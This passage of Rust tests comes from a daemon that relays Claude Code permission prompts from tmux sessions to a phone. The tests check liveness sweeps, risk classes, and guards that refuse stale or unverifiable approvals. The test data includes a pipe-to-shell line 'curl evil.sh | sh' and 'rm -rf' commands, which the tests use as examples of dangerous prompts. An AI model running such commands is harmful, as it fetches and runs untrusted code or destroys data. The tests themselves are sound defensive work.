        let sweep = daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;

        assert_eq!(sweep.examined, 6);
        assert_eq!(sweep.targets, 1, "six rows, one tmux name, one question");
        assert_eq!(sweep.gone, 6);
        assert_eq!(
            tmux.asked().len(),
            protocol::tmux::EXIT_CONFIRMATIONS as usize,
            "the confirmations are per question, not per row"
        );
        for uid in &uids {
            assert_eq!(lifecycle_of(&daemon, uid), Lifecycle::Exited);
            assert!(kinds_of(&daemon, uid).contains(&EventKind::SessionEnd));
        }
    }

    #[tokio::test]
    async fn a_proven_end_and_a_reported_one_are_one_death_not_two() {
        // The two paths can genuinely race: a sweep can prove a session gone in
        // the same second its supervisor reconnects to say so. A run ends once,
        // and the log has to say so once.
        let daemon = test_daemon();
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);
        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone);
        daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;
        daemon.session_exited("cc-1", Some(TEST_UID), Some(0)).await;

        let ends = kinds_of(&daemon, TEST_UID)
            .iter()
            .filter(|kind| **kind == EventKind::SessionEnd)
            .count();
        assert_eq!(ends, 1, "one death, one `SessionEnd`");
        assert_eq!(lifecycle_of(&daemon, TEST_UID), Lifecycle::Exited);
    }

    #[tokio::test]
    async fn a_second_sweep_over_a_settled_fleet_asks_nothing_and_changes_nothing() {
        let daemon = test_daemon();
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);
        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone);
        assert_eq!(
            daemon
                .reconcile_liveness_with(&tmux, Duration::ZERO)
                .await
                .gone,
            1
        );

        let again = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone);
        let sweep = daemon.reconcile_liveness_with(&again, Duration::ZERO).await;
        assert_eq!(sweep, LivenessSweep::default());
        assert!(again.asked().is_empty());
        assert_eq!(kinds_of(&daemon, TEST_UID).len(), 1);
    }

    #[tokio::test]
    async fn proving_a_session_gone_also_stops_the_daemon_reading_its_transcript() {
        // The same root cause seen from the filesystem. Nothing could tell the
        // tailer a run had finished, because until the sweep existed the daemon
        // could not establish that on its own — so every ended session's
        // transcript stayed on the poll list and its working directory stayed
        // watched, for the life of the process and again after every restart.
        // Measured on the owner's Mac: 1,282 `fsevents could not watch` lines
        // in one error log, against directories deleted days earlier.
        let (daemon, mut tails) = daemon_watching_tails(shared_store(), Config::default());
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);

        let tmux = ScriptedPresence::always(protocol::tmux::SessionPresence::Gone);
        daemon.reconcile_liveness_with(&tmux, Duration::ZERO).await;

        let command = tails.try_recv().expect("the tailer must be told to stop");
        assert_eq!(
            command,
            crate::tailer::TailCommand::Stop {
                session_uid: TEST_UID.to_string()
            }
        );
    }

    #[tokio::test]
    async fn a_reported_exit_stops_the_tail_too_rather_than_only_a_proven_one() {
        // Both paths run through one `mark_exited`, which is what makes this
        // true by construction rather than by two people remembering.
        let (daemon, mut tails) = daemon_watching_tails(shared_store(), Config::default());
        seed_session(&daemon, TEST_UID, "cc-1", Lifecycle::Live);
        daemon.session_exited("cc-1", Some(TEST_UID), Some(0)).await;
        assert_eq!(
            tails.try_recv().expect("the tailer must be told to stop"),
            crate::tailer::TailCommand::Stop {
                session_uid: TEST_UID.to_string()
            }
        );
    }

    #[test]
    fn a_sweep_that_could_not_see_never_reads_as_a_healthy_fleet() {
        // The same rule the startup log-integrity banner follows: the sentence
        // is derived from the numbers, so it cannot say everything is fine on
        // the line after reporting that nothing could be established.
        let blind = LivenessSweep {
            examined: 26,
            targets: 26,
            unknown: 26,
            ..LivenessSweep::default()
        };
        let summary = blind.summary();
        assert!(summary.contains("could not be established"), "{summary}");
        assert!(summary.contains("0 running"), "{summary}");

        let healthy = LivenessSweep {
            examined: 3,
            targets: 3,
            present: 3,
            ..LivenessSweep::default()
        };
        assert!(
            !healthy.summary().contains("could not"),
            "{}",
            healthy.summary()
        );
        assert_eq!(
            LivenessSweep::default().summary(),
            "no session needed checking"
        );
    }

    // ------------------------------------------------------------ risk

    #[tokio::test]
    async fn approval_cards_carry_a_risk_class() {
        let daemon = test_daemon();
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.to_string()),
                event: "PermissionRequest".into(),
                payload: json!({
                    "hook_event_name": "PermissionRequest",
                    "session_id": "uuid",
                    "cwd": "/tmp",
                    "prompt_id": "p1",
                    "tool_name": "Bash",
                    "tool_input": {"command": "rm -rf /tmp/build"},
                }),
                wait: false,
            })
            .await;

        let event = daemon
            .store
            .events_after(TEST_UID, 0, 10)
            .unwrap()
            .into_iter()
            .find(|e| e.kind == EventKind::ApprovalRequest)
            .expect("an approval must be logged");
        assert_eq!(event.payload["card"]["risk"]["class"], "high");
        assert_eq!(event.payload["card"]["risk"]["matched_pattern"], "rm -rf");
    }

    #[tokio::test]
    async fn a_read_only_tool_is_classified_low() {
        let daemon = test_daemon();
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.to_string()),
                event: "PermissionRequest".into(),
                payload: json!({
                    "hook_event_name": "PermissionRequest",
                    "tool_name": "Read",
                    "tool_input": {"file_path": "/tmp/x"},
                }),
                wait: false,
            })
            .await;
        let event = daemon
            .store
            .events_after(TEST_UID, 0, 10)
            .unwrap()
            .into_iter()
            .find(|e| e.kind == EventKind::ApprovalRequest)
            .unwrap();
        assert_eq!(event.payload["card"]["risk"]["class"], "low");
        assert!(event.payload["card"]["risk"]["matched_pattern"].is_null());
    }

    // ------------------------------------------------- local resolution

    /// Drive a PermissionRequest and then its PostToolUse, as a real session
    /// does when the operator approves at the keyboard.
    async fn approve_at_the_keyboard(daemon: &Arc<Daemon>) -> String {
        let tool_input = json!({"command": "touch /tmp/x"});
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.to_string()),
                event: "PreToolUse".into(),
                payload: json!({
                    "hook_event_name": "PreToolUse",
                    "prompt_id": "p1",
                    "tool_name": "Bash",
                    "tool_input": tool_input,
                    "tool_use_id": "toolu_local",
                }),
                wait: false,
            })
            .await;
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.to_string()),
                event: "PermissionRequest".into(),
                payload: json!({
                    "hook_event_name": "PermissionRequest",
                    "prompt_id": "p1",
                    "tool_name": "Bash",
                    "tool_input": tool_input,
                }),
                wait: false,
            })
            .await;
        "toolu_local".to_string()
    }

    #[tokio::test]
    async fn a_tool_result_resolves_its_approval_as_answered_locally() {
        let daemon = test_daemon();
        let request_id = approve_at_the_keyboard(&daemon).await;
        assert_eq!(
            daemon.sessions().await.unwrap()[0].blocked_on,
            vec![request_id.clone()]
        );

        // The tool ran, which only happens if a human approved it.
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.to_string()),
                event: "PostToolUse".into(),
                payload: json!({
                    "hook_event_name": "PostToolUse",
                    "tool_name": "Bash",
                    "tool_use_id": request_id,
                }),
                wait: false,
            })
            .await;
        daemon.sweep_local_resolutions().await;

        assert!(
            daemon.sessions().await.unwrap()[0].blocked_on.is_empty(),
            "the card must stop asking once it has been answered"
        );
        let (_, outcome) = daemon
            .store
            .get_answer(TEST_UID, &request_id)
            .unwrap()
            .unwrap();
        assert_eq!(outcome.resolved_by, ResolvedBy::Local);
        assert_eq!(outcome.decision, AnswerDecision::Allow);
        assert!(!outcome.inferred, "a tool that ran is an observation");

        // And a late tap from the phone is a no-op returning that outcome.
        let late = daemon
            .answer(&request_id, "any-hash", AnswerDecision::Deny, None)
            .await;
        assert!(matches!(late, AnswerResult::Duplicate { .. }), "{late:?}");
    }

    #[tokio::test]
    async fn an_unanswered_approval_is_left_alone_during_the_grace_period() {
        // The expensive mistake would be resolving a card the human has not
        // answered: it would vanish from the phone while the Mac still waits.
        let daemon = test_daemon();
        let request_id = approve_at_the_keyboard(&daemon).await;
        for _ in 0..3 {
            daemon.sweep_local_resolutions().await;
        }
        assert_eq!(
            daemon.sessions().await.unwrap()[0].blocked_on,
            vec![request_id],
            "nothing observed means nothing resolved"
        );
    }

    #[tokio::test]
    async fn an_unreadable_pane_is_not_treated_as_an_absent_prompt() {
        // No supervisor is attached, so `capture` fails. That is "we cannot
        // see", not "the prompt is gone", and must resolve nothing even long
        // after the grace period.
        let daemon = daemon_with(Config {
            local_resolve_grace_ms: 1,
            ..Config::default()
        });
        let request_id = approve_at_the_keyboard(&daemon).await;
        tokio::time::sleep(Duration::from_millis(5)).await;
        for _ in 0..5 {
            daemon.sweep_local_resolutions().await;
        }
        assert_eq!(
            daemon.sessions().await.unwrap()[0].blocked_on,
            vec![request_id]
        );
    }

    #[tokio::test]
    async fn local_resolution_can_be_switched_off() {
        let daemon = daemon_with(Config {
            local_resolve: false,
            ..Config::default()
        });
        let request_id = approve_at_the_keyboard(&daemon).await;
        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: Some(TEST_UID.to_string()),
                event: "PostToolUse".into(),
                payload: json!({
                    "hook_event_name": "PostToolUse",
                    "tool_use_id": request_id,
                }),
                wait: false,
            })
            .await;
        daemon.sweep_local_resolutions().await;
        assert_eq!(
            daemon.sessions().await.unwrap()[0].blocked_on,
            vec![request_id]
        );
    }

    // ======================================================== prompt identity

    #[tokio::test]
    async fn an_answer_bound_to_prompt_n_is_refused_once_prompt_n_plus_1_is_on_screen() {
        // Two prompts in a row, worded identically because Claude words them
        // identically — "Do you want to proceed", the same three options, the
        // same footer. A presence check cannot tell them apart, which is
        // precisely why the card carries a generation.
        //
        // Answering the first card once the second is up used to type "1" into
        // the second prompt: an approval for a command nobody read.
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;

        let first = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &first).await, "prompt 1 must bind");

        // The human answered prompt 1 at the keyboard; Claude asks the next
        // thing. Same wording, different command.
        pane.show(&permission_pane("rm -rf /tmp/b"));
        let second = raise_prompt(&daemon, uid, "p2", "rm -rf /tmp/b").await;
        assert!(
            wait_bound(&daemon, uid, &second).await,
            "prompt 2 must bind"
        );
        assert_ne!(first, second);

        let stale_hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
        let result = daemon
            .answer(&first, &stale_hash, AnswerDecision::Allow, Some(uid))
            .await;
        match &result {
            AnswerResult::Rejected { reason } => {
                assert!(
                    reason.contains("superseded") || reason.contains("prompt"),
                    "the refusal must say why: {reason}"
                );
            }
            other => panic!("an answer for a replaced prompt must be refused: {other:?}"),
        }
        assert!(
            pane.typed().is_empty(),
            "nothing may be typed for a superseded card: {:?}",
            pane.typed()
        );

        // The current card is still perfectly answerable — the guard is about
        // identity, not about being cautious in general.
        let live_hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "rm -rf /tmp/b"}));
        let applied = daemon
            .answer(&second, &live_hash, AnswerDecision::Allow, Some(uid))
            .await;
        assert!(
            matches!(applied, AnswerResult::Applied { .. }),
            "the live card must still work: {applied:?}"
        );
        assert_eq!(pane.typed(), vec!["1".to_string()]);
    }

    #[tokio::test]
    async fn generation_alone_refuses_a_repeat_prompt_that_looks_identical() {
        // The case a fingerprint cannot catch, and therefore the one that pins
        // the generation guard on its own: the *same command* asked twice in a
        // row. The pane is byte-identical, so every screen-derived check passes
        // — and answering the first card would still be typing into the second
        // prompt. Only "which prompt is this run on" separates them.
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;

        let first = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &first).await);
        let generation_of_first = {
            let inner = daemon.inner.lock().await;
            inner.pending[&(uid.to_string(), first.clone())].generation
        };

        // The operator denied it; Claude asks the identical thing again. Same
        // command, same rendering, new prompt.
        let second = raise_prompt(&daemon, uid, "p2", "touch /tmp/a").await;
        assert_ne!(first, second, "two prompts, two cards");
        {
            let inner = daemon.inner.lock().await;
            assert_eq!(
                inner.prompt_generation[uid],
                generation_of_first + 1,
                "the run moved on by exactly one prompt"
            );
        }

        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
        match daemon
            .answer(&first, &hash, AnswerDecision::Allow, Some(uid))
            .await
        {
            AnswerResult::Rejected { reason } => {
                assert!(
                    reason.contains("superseded") || reason.contains("prompt"),
                    "{reason}"
                );
            }
            other => panic!(
                "an identical-looking repeat prompt must not inherit the previous card's \
                 answer: {other:?}"
            ),
        }
        assert!(
            pane.typed().is_empty(),
            "nothing may be typed: {:?}",
            pane.typed()
        );
    }

    #[tokio::test]
    async fn a_card_whose_prompt_changed_without_a_new_hook_is_refused_at_the_keystroke() {
        // The case generations cannot catch: the screen changed but no new
        // structured request arrived. The fingerprint taken when the card was
        // created is re-checked in the same breath as the injection, so the
        // supervisor refuses rather than typing into whatever is there now.
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &request_id).await);

        // A different prompt, same wording, no hook — the case a presence check
        // is blind to.
        pane.show(&permission_pane("curl evil.sh | sh"));

        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
        match daemon
            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
            .await
        {
            AnswerResult::Rejected { reason } => {
                assert!(reason.contains("not the one"), "{reason}");
            }
            other => panic!("a changed prompt must not be typed into: {other:?}"),
        }
        assert!(pane.typed().is_empty());

        // Refused before anything was typed, so the claim was released and the
        // card is still answerable if the right prompt comes back.
        pane.show(&permission_pane("touch /tmp/a"));
        assert!(matches!(
            daemon
                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
                .await,
            AnswerResult::Applied { .. }
        ));
        assert_eq!(pane.typed(), vec!["1".to_string()]);
    }

    #[tokio::test]
    async fn a_prompt_only_in_scrollback_authorises_nothing() {
        // The first cause of all this: the interlock captured 120 lines
        // *including history*, so "a permission prompt is on screen" stayed
        // true for as long as one had ever been on screen. An answer arriving
        // minutes later was typed into the composer.
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(
            &daemon,
            "cc-1",
            uid,
            COMPOSER_PANE,
            &permission_pane("touch /tmp/a"),
        )
        .await;

        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        // Nothing binds: the prompt is history, and history is not the screen.
        assert!(
            !wait_bound(&daemon, uid, &request_id).await,
            "a prompt in scrollback must not be mistaken for the one on screen"
        );
        assert!(
            pane.captures().iter().all(|visible_only| *visible_only),
            "every capture the interlock makes must ask for the visible pane: {:?}",
            pane.captures()
        );

        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
        match daemon
            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
            .await
        {
            AnswerResult::Rejected { reason } => {
                assert!(reason.contains("could not be identified"), "{reason}");
            }
            other => panic!("an unidentifiable prompt must not be answered: {other:?}"),
        }
        assert!(pane.typed().is_empty(), "{:?}", pane.typed());
    }

    #[tokio::test]
    async fn a_supervisor_that_cannot_check_identity_is_never_asked_to_type_an_approval() {
        // A supervisor from before minor 3 accepts the fingerprint field and
        // silently drops it, so an approval sent through one would look checked
        // and be unchecked. The rule is simple: fail toward the human.
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach_speaking(
            &daemon,
            "cc-1",
            uid,
            &permission_pane("touch /tmp/a"),
            "",
            2,
        )
        .await;
        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &request_id).await);

        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
        match daemon
            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
            .await
        {
            AnswerResult::Rejected { reason } => {
                assert!(reason.contains("predates prompt identity"), "{reason}");
            }
            other => panic!("an unverifiable supervisor must not be typed through: {other:?}"),
        }
        assert!(pane.typed().is_empty());
    }

    #[tokio::test]
    async fn a_superseded_card_stops_asking_and_is_recorded_as_superseded() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        let first = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert_eq!(
            daemon.sessions().await.unwrap()[0].blocked_on,
            vec![first.clone()]
        );

        pane.show(&permission_pane("touch /tmp/b"));
        let second = raise_prompt(&daemon, uid, "p2", "touch /tmp/b").await;

        assert_eq!(
            daemon.sessions().await.unwrap()[0].blocked_on,
            vec![second],
            "only the current prompt may still be asking"
        );
        let (_, outcome) = daemon.store.get_answer(uid, &first).unwrap().unwrap();
        assert_eq!(outcome.resolved_by, ResolvedBy::Superseded);
        assert!(outcome.inferred, "nobody observed an answer to this one");
        assert!(pane.typed().is_empty());
    }

    // =================================================== ordering and publish

    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn append_and_publish_are_serialised_per_run() {
        // Assigning a seq and publishing it are two steps, and without a gate
        // around *both* a task holding seq 1 can be overtaken by one holding
        // seq 2 — after which the socket has seen 2 and can never accept 1.
        // The gate is what makes "the order they were numbered" and "the order
        // they were sent" the same sentence.
        //
        // Held from the outside here, which is the only way to assert its
        // existence rather than its luck: while the gate is held, an ingest for
        // that run must not be able to complete.
        let daemon = test_daemon();
        let key = test_key();
        seed_session(&daemon, &key.uid, &key.name, Lifecycle::Live);
        let gate = daemon.publish_gate(&key.uid).await;
        let held = gate.lock().await;

        let ingest = {
            let daemon = Arc::clone(&daemon);
            let key = key.clone();
            tokio::spawn(async move {
                daemon
                    .ingest(
                        PendingEvent::new(&key, EventKind::ToolCall, json!({}), Source::Hook)
                            .with_source_event_id("blocked"),
                    )
                    .await
            })
        };
        tokio::time::sleep(Duration::from_millis(80)).await;
        assert!(
            !ingest.is_finished(),
            "an ingest must not be able to number or publish an event while the run's \
             gate is held"
        );
        assert_eq!(
            daemon.store.max_seq(&key.uid).unwrap(),
            0,
            "and it must not have reached the store either"
        );

        drop(held);
        assert!(ingest.await.unwrap().unwrap().is_some());
        assert_eq!(daemon.store.max_seq(&key.uid).unwrap(), 1);
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 8)]
    async fn concurrent_ingests_reach_a_subscriber_in_sequence_order() {
        // The property the gate buys, under the load that used to break it.
        // Every subscriber must see 1, 2, 3 … with no reordering, because a
        // socket that receives a higher seq first has no way to accept the
        // lower one afterwards.
        let daemon = test_daemon();
        let key = test_key();
        seed_session(&daemon, &key.uid, &key.name, Lifecycle::Live);
        let mut events = daemon.events_tx.subscribe();

        let mut tasks = Vec::new();
        for i in 0..64u32 {
            let daemon = Arc::clone(&daemon);
            let key = key.clone();
            tasks.push(tokio::spawn(async move {
                daemon
                    .ingest(
                        PendingEvent::new(&key, EventKind::ToolCall, json!({"i": i}), Source::Hook)
                            .with_source_event_id(format!("e{i}")),
                    )
                    .await
            }));
        }
        for task in tasks {
            task.await.unwrap().unwrap();
        }

        let mut seen = Vec::new();
        while let Ok(event) = events.try_recv() {
            seen.push(event.seq);
        }
        assert_eq!(
            seen,
            (1..=64u64).collect::<Vec<_>>(),
            "published order must be assignment order"
        );
    }

    // =========================================== durable pending + two-phase

    #[tokio::test]
    async fn an_open_card_survives_a_restart_and_is_rebound_against_the_screen() {
        // Pending approvals were memory-only, so a restart answered "unknown or
        // already-resolved request" to a tap on a card that was still on the
        // screen in front of the human. It is a durable fact in the log; the
        // projection now survives with it.
        let store = shared_store();
        let uid = TEST_UID;
        {
            let daemon = daemon_on(Arc::clone(&store), Config::default());
            let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
            let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
            assert!(wait_bound(&daemon, uid, &request_id).await);
            drop(pane);
        } // ccd is killed here

        let daemon = daemon_on(
            Arc::clone(&store),
            Config {
                local_resolve_grace_ms: 1,
                ..Config::default()
            },
        );
        daemon.recover().await;
        let request_id = format!(
            "pr-p1-{}",
            &protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}))
                [..16]
        );
        assert_eq!(
            daemon.sessions().await.unwrap()[0].blocked_on,
            vec![request_id.clone()],
            "the card must still be asking after a restart"
        );

        // Recovered without an identity: this process never saw the screen the
        // card was created against, so it may not act on it yet.
        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        match daemon
            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
            .await
        {
            AnswerResult::Rejected { reason } => {
                assert!(reason.contains("could not be identified"), "{reason}");
            }
            other => panic!("a recovered card must not act on an unverified screen: {other:?}"),
        }
        assert!(pane.typed().is_empty());

        // …and is rebound against what is actually visible, at which point it
        // becomes answerable again.
        tokio::time::sleep(Duration::from_millis(5)).await;
        daemon.sweep_local_resolutions().await;
        assert!(
            wait_bound(&daemon, uid, &request_id).await,
            "the sweep must re-establish identity against the current prompt"
        );
        assert!(matches!(
            daemon
                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
                .await,
            AnswerResult::Applied { .. }
        ));
        assert_eq!(pane.typed(), vec!["1".to_string()]);
    }

    #[tokio::test]
    async fn an_answer_interrupted_mid_injection_is_never_typed_again() {
        // The two-phase claim. Actuation used to precede the durable ledger, so
        // a daemon killed between typing and recording came back with no record
        // that anything had been attempted — and the next tap typed the answer
        // into the agent a second time.
        let store = shared_store();
        let uid = TEST_UID;
        let request_id = "toolu_interrupted";
        let payload_hash = "hash-of-the-card";

        // Exactly what a kill between the two writes leaves behind.
        store
            .claim_answer(&AnswerClaim {
                session_uid: uid.to_string(),
                session_id: "cc-1".to_string(),
                request_id: request_id.to_string(),
                payload_hash: payload_hash.to_string(),
                decision: serde_json::to_string(&AnswerDecision::Allow).unwrap(),
                started_at: protocol::time::now_rfc3339(),
            })
            .unwrap();
        assert!(store.get_answer(uid, request_id).unwrap().is_none());

        let daemon = daemon_on(Arc::clone(&store), Config::default());
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        daemon.recover().await;

        // Recovery turns it into a terminal outcome that says what is true: the
        // decision is known, whether it landed is not.
        let (_, outcome) = store.get_answer(uid, request_id).unwrap().unwrap();
        assert!(
            outcome.indeterminate,
            "the outcome must not claim to be settled"
        );
        assert!(!outcome.inferred, "the *decision* was never in doubt");
        assert_eq!(outcome.decision, AnswerDecision::Allow);
        assert!(store.answer_claim(uid, request_id).unwrap().is_none());

        // And the retry replays that, rather than re-injecting.
        match daemon
            .answer(request_id, payload_hash, AnswerDecision::Allow, Some(uid))
            .await
        {
            AnswerResult::Duplicate { outcome, .. } => assert!(outcome.indeterminate),
            other => panic!("a retry must not re-apply an interrupted answer: {other:?}"),
        }
        assert!(
            pane.typed().is_empty(),
            "nothing may be typed a second time: {:?}",
            pane.typed()
        );
    }

    #[tokio::test]
    async fn a_successful_answer_leaves_no_claim_behind_and_a_refused_one_releases_it() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &request_id).await);
        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));

        // Refused before anything is typed: the claim must not survive, or the
        // card would be permanently unanswerable for a keystroke never sent.
        pane.show(COMPOSER_PANE);
        assert!(matches!(
            daemon
                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
                .await,
            AnswerResult::Rejected { .. }
        ));
        assert!(
            daemon
                .store
                .answer_claim(uid, &request_id)
                .unwrap()
                .is_none(),
            "a refusal types nothing, so it must leave nothing claimed"
        );

        // Applied: the claim and the outcome settle in one transaction.
        pane.show(&permission_pane("touch /tmp/a"));
        assert!(matches!(
            daemon
                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
                .await,
            AnswerResult::Applied { .. }
        ));
        assert!(daemon
            .store
            .answer_claim(uid, &request_id)
            .unwrap()
            .is_none());
        assert!(daemon.store.get_answer(uid, &request_id).unwrap().is_some());
        // The durable projection goes with it, so a restart does not resurrect
        // a card that has been answered.
        assert!(daemon.store.list_pending_approvals().unwrap().is_empty());
    }

    /// **The keyboard question follows the target.** `targets_composer` is
    /// what turns on the supervisor's cursor check, and only the composer may
    /// be asked: a permission prompt is a view and hides the cursor exactly as
    /// every view does, so asking it there would refuse every answer ever
    /// tapped. Free text goes to the composer, and a composer under a view
    /// that holds the keyboard is drawn and dead — see the supervisor's
    /// `authorise`, which is where the flag is spent, and
    /// `a_view_holding_the_keyboard_refuses_the_send_even_with_a_drawn_composer`,
    /// which is where the refusal it buys is pinned.
    #[tokio::test]
    async fn free_text_is_aimed_at_the_composer_and_an_answer_is_not() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;

        // A takeover. It carries no fingerprint — it answers no prompt — so an
        // unbound card is exactly the shape it arrives in.
        let takeover = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
        assert!(
            matches!(
                daemon
                    .answer(
                        &takeover,
                        &hash,
                        AnswerDecision::Text {
                            text: "carry on".into()
                        },
                        Some(uid),
                    )
                    .await,
                AnswerResult::Applied { .. }
            ),
            "the composer is on screen, so the text lands"
        );

        // An answer to the prompt itself.
        pane.show(&permission_pane("touch /tmp/b"));
        let answered = raise_prompt(&daemon, uid, "p2", "touch /tmp/b").await;
        assert!(wait_bound(&daemon, uid, &answered).await);
        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/b"}));
        assert!(matches!(
            daemon
                .answer(&answered, &hash, AnswerDecision::Allow, Some(uid))
                .await,
            AnswerResult::Applied { .. }
        ));

        assert_eq!(
            pane.aimed_at_composer(),
            vec![true, false],
            "free text aims at the composer; an answer aims at the prompt"
        );
        assert_eq!(pane.typed(), vec!["carry on".to_string(), "1".to_string()]);
    }

    #[tokio::test]
    async fn a_duplicate_permission_hook_never_resurrects_a_resolved_card() {
        // `ingest`'s duplicate result was computed and thrown away, then a
        // pending entry was inserted unconditionally — so a hook redelivered
        // after the card had been answered put a phantom block back on the
        // session that nothing could ever resolve.
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &request_id).await);

        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
        assert!(matches!(
            daemon
                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
                .await,
            AnswerResult::Applied { .. }
        ));
        assert!(daemon.sessions().await.unwrap()[0].blocked_on.is_empty());
        let seq_after_answer = daemon.store.max_seq(uid).unwrap();

        // The same hook again — a shell wrapper retry, a redelivery, a rescan.
        let same = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert_eq!(same, request_id);
        assert!(
            daemon.sessions().await.unwrap()[0].blocked_on.is_empty(),
            "a replayed hook must not put an answered card back on the session"
        );
        assert_eq!(
            daemon.store.max_seq(uid).unwrap(),
            seq_after_answer,
            "and it must not burn a sequence number either"
        );
        assert_eq!(pane.typed(), vec!["1".to_string()], "typed exactly once");
    }

    #[tokio::test]
    async fn a_duplicate_hook_does_not_advance_the_prompt_generation() {
        // A generation that moved on a replay would make the *live* card behind
        // the run and refuse the answer to a prompt that is still on screen —
        // the same defect wearing different clothes.
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &request_id).await);

        for _ in 0..3 {
            raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        }
        {
            let inner = daemon.inner.lock().await;
            assert_eq!(
                inner.prompt_generation[uid], 1,
                "one prompt, one generation"
            );
            assert_eq!(inner.pending.len(), 1);
        }

        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
        assert!(matches!(
            daemon
                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
                .await,
            AnswerResult::Applied { .. }
        ));
        assert_eq!(pane.typed(), vec!["1".to_string()]);
    }

    // ===================================================== payload truncation

    #[tokio::test]
    async fn an_oversized_payload_is_cut_on_a_character_boundary() {
        // `String::truncate` panics on a non-boundary byte, and a tool response
        // is exactly the payload that carries multi-byte text — a path with an
        // accent, a diff with an emoji. The cap was also being reported *after*
        // the cut, so the recorded original size was the truncated one.
        let daemon = daemon_with(Config {
            max_payload_bytes: 4096,
            ..Config::default()
        });
        // Emoji are four bytes each, so the cap lands mid-character for three
        // of every four possible caps; this one is chosen to land inside one.
        let text = "🔥".repeat(4096);
        let mut pending = PendingEvent::new(
            &test_key(),
            EventKind::ToolResult,
            json!({ "stdout": text }),
            Source::Hook,
        );
